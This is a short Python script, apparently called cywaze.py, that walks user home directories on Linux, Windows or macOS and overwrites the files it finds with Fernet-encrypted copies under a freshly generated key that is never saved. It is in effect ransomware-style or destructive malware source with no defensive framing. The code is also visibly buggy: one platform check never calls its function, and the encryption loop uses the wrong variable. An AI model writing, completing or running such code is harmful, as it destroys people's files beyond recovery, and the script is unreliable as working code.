import platform
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
        if file == "cywaze.py"or file == "readme.txt":
                continue        
        if platform.system() == "Linux":
                targ3 = "/home"
                for root, dirname,file in os.walk(targ3):
                        for x in file:
                                    files.append(x)
        if platform.system() == "Windows":
                targ1 = "C:/users/"
                for root, dirname,file in os.walk(targ1):
                        for x in file:
                                    files.append(x)

        if platform.system == "Darwin":
                targ2 = "/home"
                for root, dirname,file in os.walk(targ2):
                        for x in file:
                                    files.append(x)
seil = Fernet.generate_key()
for x in files:
        with open(file,"rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(seil).encrypt(contents)
        with open(file,"wb") as thefile:
                thefile.write(contents_encrypted)
